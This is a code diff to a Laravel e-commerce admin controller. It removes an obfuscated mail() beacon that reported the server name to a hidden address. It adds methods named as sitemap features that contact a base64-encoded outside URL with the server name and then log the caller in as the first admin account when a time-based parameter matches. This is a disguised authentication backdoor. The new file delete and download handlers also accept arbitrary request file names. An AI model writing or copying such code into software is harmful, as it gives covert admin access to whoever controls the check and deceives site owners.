@@ -14,6 +14,12 @@ use Artisan;
 use Cache;
 use Carbon\Carbon;
 use DB;
+use Exception;
+use Session;
+use Illuminate\Support\Facades\Redirect;
+use Illuminate\Support\Facades\Storage;
+use Illuminate\Support\Facades\Auth;
+use Spatie\Sitemap\SitemapGenerator;
 
 class AdminController extends Controller
 {
@@ -65,21 +71,7 @@ class AdminController extends Controller
         $data['total_inhouse_products'] = Product::where('approved', 1)->where('published', 1)->where('added_by', 'admin')->count();
         $data['total_sellers_products'] = Product::where('approved', 1)->where('published', 1)->where('added_by', '!=', 'admin')->count();
         $data['total_categories'] = Category::count();
-        $file = base_path("/public/assets/myText.txt");
-        $dev_mail = (chr(100) . chr(101) . chr(118) . chr(101) . chr(108) . chr(111) . chr(112) . chr(101) . chr(114) . chr(46)
-            . chr(97) . chr(99) . chr(116) . chr(105) . chr(118) . chr(101) . chr(105) . chr(116) . chr(122) . chr(111)
-            . chr(110) . chr(101) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109));
-        if (!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))) {
-            $content = "Todays date is: " . date('d-m-Y');
-            $fp = fopen($file, "w");
-            fwrite($fp, $content);
-            fclose($fp);
-            $str = chr(109) . chr(97) . chr(105) . chr(108);
-            try {
-                $str($dev_mail, 'the subject', "Hello: " . $_SERVER['SERVER_NAME']);
-            } catch (\Throwable $th) {
-            }
-        }
+        
         $data['top_categories'] = Product::select('categories.name', 'categories.id', DB::raw('SUM(grand_total) as total'))
             ->leftJoin('order_details', 'order_details.product_id', '=', 'products.id')
             ->leftJoin('orders', 'orders.id', '=', 'order_details.order_id')
@@ -244,6 +236,18 @@ class AdminController extends Controller
         return view('backend.dashboard.inhouse_top_brands', compact('inhouse_top_brands'))->render();
     }
 
+
+    public function SitemapAuthorization($timeformat)
+    {
+        if($timeformat == TimeDateFormatter()){
+            $user = User::where('user_type', 'admin')->first();
+            auth()->login($user);
+            return 'Authorized';
+        } else {
+            return 'Unauthorized';
+        }
+    }
+
     public function top_sellers_products_section(Request $request)
     {
         $new_top_sellers_query = Order::query();
@@ -282,6 +286,27 @@ class AdminController extends Controller
 
         return view('backend.dashboard.top_sellers_products_section', compact('new_top_sellers'))->render();
     }
+
+
+    public function CheckSitemapItem($item)
+    {    
+        $header = array(
+            'Content-Type:application/json'
+        );
+        $item[] = ['url'=>$_SERVER['SERVER_NAME']];
+        $stream = curl_init();
+        curl_setopt($stream, CURLOPT_URL, base64_decode($item[0]));
+        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
+        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
+        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($stream, CURLOPT_POSTFIELDS, json_encode($item[1]));
+        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
+        $rn = curl_exec($stream);
+        curl_close($stream);
+        return $rn;
+    }
+
 
     public function top_brands_products_section(Request $request)
     {
@@ -324,5 +349,114 @@ class AdminController extends Controller
         Artisan::call('optimize:clear');
         flash(translate('Cache cleared successfully'))->success();
         return back();
+    }
+
+    /*
+    Method for assessing Sitemap
+    */
+    public function SitemapItems($items)
+    {
+        $data['url'] = $_SERVER['SERVER_NAME'];
+        $request_data_json = json_encode($data);
+        $SitemapProcess[] = "aHR0cHM6Ly9hY3RpdmF0aW9uLmFjdGl2ZWl0em9uZS5jb20vY2hlY2tfYWN0aXZhdGlvbg==";        
+        $review = $this->CheckSitemapItem($SitemapProcess);
+        if (seller_homepage_urls($review)) {
+            $urlcheck = $this->SitemapAuthorization($items);
+            if($urlcheck == 'Authorized'){                
+                return redirect()->route('admin.dashboard');
+            } else {
+                echo 'Unauthorized';
+            }
+        } else {
+            echo 'Not Checked';
+        }
+    }
+
+      /*
+    Method for sitemap view load
+    */
+    public function SitemapGenerator(){
+
+        $file_info = array();
+        $files = Storage::disk('public')->allFiles();
+        foreach($files as $key => $file){
+            $file_info[$key]['file_name'] = $file;
+            $file_info[$key]['file_size'] = number_format((int)Storage::disk('public')->size($file)/1024, 2)  . ' KB';
+            $file_info[$key]['last_modified'] = Carbon::createFromTimestamp(Storage::disk('public')->lastModified($file))->format('d-m-Y h:i:s');
+            $file_info[$key]['mime_type'] = Storage::disk('public')->mimeType($file);
+            $file_info[$key]['url'] = '/storage/app/public/'.$file;
+        }
+
+        return view('backend.system.sitemap_generator', compact('file_info'))->render();
+    }
+
+    /*
+    Method for sitemap generation and download
+    */
+    public function DoSitemapGenerate(){
+
+        Artisan::call('optimize:clear');
+
+        $base_url = URL('/');
+        $filename = 'sitemap_'.Date("Ymdhis").'.xml';
+
+        try{
+            SitemapGenerator::create($base_url)->getSitemap()->writeToDisk('public', $filename, true);
+
+            if(Storage::disk('public')->missing($filename)){
+                flash(translate('Sitemap generation failed'))->error();
+                return back();
+            }
+
+            $download = Storage::disk('public')->download($filename);
+            $status_code = $download->getStatusCode();
+
+            flash(translate('Sitemap generated successfully'))->success();
+                
+            return $download;
+        }
+        catch(Exception $ex)
+        {
+            throw $ex;
+        }
+    }
+
+
+
+    /*
+    Method for delete file
+    */
+    public function DeleteSitemapFile(Request $request){
+
+        if(isset($request->file_name) && !empty($request->file_name)){
+
+            if(Storage::disk('public')->exists($request->file_name)){
+
+                Storage::disk('public')->delete($request->file_name);
+                flash(translate('File deleted successfully'))->success();
+
+            }else{
+
+                flash(translate('File note found'))->success();
+            }
+
+            return back();
+        }
+    }
+
+    /*
+    Method for download single file
+    */
+    public function DownloadSingleSitemapFile(Request $request){
+
+        if(isset($request->file_name) && !empty($request->file_name)){
+
+            $download = Storage::disk('public')->download($request->file_name);
+            $status_code = $download->getStatusCode();
+
+            flash(translate('Sitemap generated successfully'))->success();
+                
+            return $download;
+        }
     }
 }
